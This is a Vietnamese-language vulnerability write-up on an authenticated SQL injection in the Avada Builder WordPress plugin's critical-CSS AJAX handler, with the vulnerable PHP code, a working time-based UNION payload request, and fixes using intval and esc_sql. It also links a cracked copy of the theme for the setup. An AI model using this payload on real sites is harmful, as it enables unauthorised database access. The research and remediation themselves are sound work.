# Multiple High and Critical Vulnerabilities in Avada Theme and Plugin

![Alt text](image.png)

- Nhiều lỗ hổng nghiêm trọng tồn tại trong Avada Theme <= 7.11.1 và Avada Builder plugin <= 3.11.1

![Alt text](image-1.png)

### Setup
- Avada Theme 7.8.2
- Avada Builder plugin 3.8.2
- Theme và plugin crack ở đây
[Source](avada.zip)


- Thêm mới theme
![Alt text](image-4.png)
- Như này là được 
![Alt text](image-5.png)
- Thêm mới plugin và add mới
![Alt text](image-2.png)
![Alt text](image-3.png)

## I. Authenticated SQL Injection in Plugin
- Enable Critical CSS để sử dụng được action trong ajax-admin
- Vào Options > Performance > Enable Critical CSS (On) > Save Changes

![Alt text](image-6.png)

![Alt text](image-7.png)

- Generate Critical Css

![Alt text](image-8.png)
- Ảnh là đặt var_dump() vào \$query cho dễ debug

- Lỗ hổng tại hàm wp-content/plugins/fusion-builder/inc/critical-css/class-awb-critical-css-page.php, function ajax_regenerate_css()

- Phần khởi tạo có add action để gọi ajax-admin nhưng cần phải xác thực.

```php
public function __construct() {
    add_action( 'admin_menu', [ $this, 'add_menu_page' ], 12 );
    add_action( 'wp_ajax_awb_search_query', [ $this, 'search_query' ] );
    add_action( 'wp_ajax_awb_critical_new', [ $this, 'ajax_get_urls' ] );
    add_action( 'wp_ajax_awb_bulk_update_css', [ $this, 'ajax_get_bulk_urls' ] );
    add_action( 'wp_ajax_awb_critical_css', [ $this, 'ajax_save_css' ] );
    add_action( 'wp_ajax_awb_regenerate_critical_css', [ $this, 'ajax_regenerate_css' ] );

    if ( is_admin() ) {
        $this->bulk_actions();
    }
}
```

![Alt text](image-9.png)

- Id được lấy từ \$_GET['awb_critical_id']
```php
$id = sanitize_text_field( wp_unslash( $_GET['awb_critical_id'] ) );

$entry = AWB_Critical_CSS()->get(
    [
        'where' => [
            'id' => '"' . $id . '"',
        ],
    ]
);
```

- Hàm get() chỉ thêm một số truy vấn điều kiện chứ không làm sạch biến id.
```php
public function get( $args = [] ) {
    global $wpdb;

    $defaults = [
        'what'     => '*',
        'where'    => [],
        'order_by' => '',
        'order'    => 'ASC',
        'limit'    => '',
        'offset'   => 0,
    ];
    $args     = wp_parse_args( $args, $defaults );

    // The table name.
    $table_name = $wpdb->prefix . $this->table_name;

    // The query basics.
    $query = 'SELECT ' . $args['what'] . " FROM `$table_name`";


    // Build the WHERE fragment of the query.
    if ( ! empty( $args['where'] ) ) {
        $where = [];
        foreach ( $args['where'] as $where_fragment_key => $where_fragment_val ) {
            if ( false === strpos( $where_fragment_val, 'LIKE' ) ) {
                $where[] = "$where_fragment_key = $where_fragment_val";
            } else {
                $where[] = "$where_fragment_key $where_fragment_val";
            }
        }

        $query .= ' WHERE ' . implode( ' AND ', $where );
    }

    // Build the ORDER BY fragment of the query.
    if ( '' !== $args['order_by'] ) {
        $order  = 'ASC' !== strtoupper( $args['order'] ) ? 'DESC' : 'ASC';
        $query .= ' ORDER BY ' . $args['order_by'] . ' ' . $order;
    }

    // Build the LIMIT fragment of the query.
    if ( '' !== $args['limit'] ) {
        $query .= ' LIMIT ' . absint( $args['limit'] );
    }

    // Build the OFFSET fragment of the query.
    if ( 0 !== $args['offset'] ) {
        $query .= ' OFFSET ' . absint( $args['offset'] );
    }

    var_dump($query);


    return $wpdb->get_results( $query ); // phpcs:ignore WordPress.DB
}
```

- Thực hiện union attack với time delay
![Alt text](image-10.png)

- Payload
```php
GET /wordpress/wp-admin/admin-ajax.php?action=awb_regenerate_critical_css&awb_critical_id=1"+union+select+sleep(10),null,null,null,null,null,null+--+- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694158744%7ClXVo7CI92RXup6lamCqGhl5mFyfqJiXHPX76FpS5I1U%7C0410ef2aa5cf0ac12660fdc07e85b9a838625dd2eb0d76af3a787f062c052b55; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694158744%7ClXVo7CI92RXup6lamCqGhl5mFyfqJiXHPX76FpS5I1U%7C8d15e3344ff93c6bea2bb124dd6ee0b8c2ca31f4b621fba30bac4127b1f32231; wp-settings-time-1=1693985946; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244
Connection: close

```

- Ở hàm wp-content/plugins/fusion-builder/inc/critical-css/class-awb-critical-css-page.php, function ajax_save_css() cũng tồn tại lỗ hổng sqli tương tự.

![Alt text](image-11.png)

#### Giải pháp
- Cách phòng chống sqli đơn giản cho id là ép kiểu về định dạng muốn.
- Dùng intval() để ép thành kiểu nguyên
![Alt text](image-12.png)

- Dùng esc_sql() của wordpress để escape dấu nháy thành 1 phần của truy vấn và không thể thoát ra câu truy vấn.
![Alt text](image-13.png)

